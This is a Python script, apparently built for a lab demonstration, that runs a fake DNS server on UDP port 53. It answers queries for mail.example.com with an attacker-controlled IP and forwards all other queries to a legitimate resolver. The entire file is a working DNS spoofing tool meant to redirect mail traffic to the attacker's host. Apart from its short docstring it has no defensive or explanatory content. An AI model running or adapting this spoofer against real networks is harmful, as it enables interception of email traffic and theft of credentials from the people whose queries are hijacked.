#!/usr/bin/env python3
"""
Fake DNS Server for Spoofing Demonstration
Responds to all DNS queries with attacker's IP for mail.example.com
Forwards other queries to legitimate DNS server
"""

import socket
import struct

ATTACKER_IP = "172.20.0.40"
REAL_DNS = "172.20.0.10"
TARGET_DOMAIN = b"mail.example.com"

def parse_dns_query(data):
    """Extract domain name from DNS query"""
    try:
        # Skip transaction ID (2 bytes) and flags (2 bytes)
        i = 12
        domain_parts = []
        while i < len(data):
            length = data[i]
            if length == 0:
                break
            i += 1
            domain_parts.append(data[i:i+length])
            i += length
        return b'.'.join(domain_parts)
    except:
        return b''

def create_dns_response(query_data, domain, spoofed_ip):
    """Create a DNS response packet"""
    # Parse the query ID
    transaction_id = query_data[:2]
    
    # Flags: Standard query response, no error
    flags = b'\x81\x80'
    
    # Questions and answers count
    questions = b'\x00\x01'  # 1 question
    answer_rrs = b'\x00\x01'  # 1 answer
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    
    # Copy the question section from query (starts at byte 12)
    question_end = query_data.index(b'\x00', 12) + 5  # Find end of domain + type + class
    question_section = query_data[12:question_end]
    
    # Answer section
    # Name pointer to question
    answer_name = b'\xc0\x0c'
    # Type A (1)
    answer_type = b'\x00\x01'
    # Class IN (1)
    answer_class = b'\x00\x01'
    # TTL
    answer_ttl = b'\x00\x00\x00\x0a'  # 10 seconds
    # Data length
    answer_length = b'\x00\x04'  # 4 bytes for IPv4
    # IP address
    ip_parts = [int(x) for x in spoofed_ip.split('.')]
    answer_data = bytes(ip_parts)
    
    response = (transaction_id + flags + questions + answer_rrs + 
                authority_rrs + additional_rrs + question_section +
                answer_name + answer_type + answer_class + answer_ttl +
                answer_length + answer_data)
    
    return response

def main():
    print("[*] Starting Fake DNS Server...")
    print(f"[*] Target domain: mail.example.com")
    print(f"[*] Spoofed IP: {ATTACKER_IP}")
    print(f"[*] Real DNS server: {REAL_DNS}")
    print("[*] Listening on UDP port 53...")
    print()
    
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))
    
    real_dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    real_dns_sock.settimeout(2)
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            domain = parse_dns_query(data)
            
            print(f"[*] Received query from {addr[0]} for: {domain.decode('utf-8', errors='ignore')}")
            
            if TARGET_DOMAIN in domain:
                # Spoof the response
                print(f"[!] SPOOFING: {domain.decode('utf-8', errors='ignore')} -> {ATTACKER_IP}")
                response = create_dns_response(data, domain, ATTACKER_IP)
                sock.sendto(response, addr)
            else:
                # Forward to real DNS
                print(f"[*] Forwarding to real DNS server...")
                try:
                    real_dns_sock.sendto(data, (REAL_DNS, 53))
                    response, _ = real_dns_sock.recvfrom(512)
                    sock.sendto(response, addr)
                except socket.timeout:
                    print(f"[!] Timeout forwarding query")
                    
        except Exception as e:
            print(f"[!] Error: {e}")
            continue

if __name__ == "__main__":
    main()
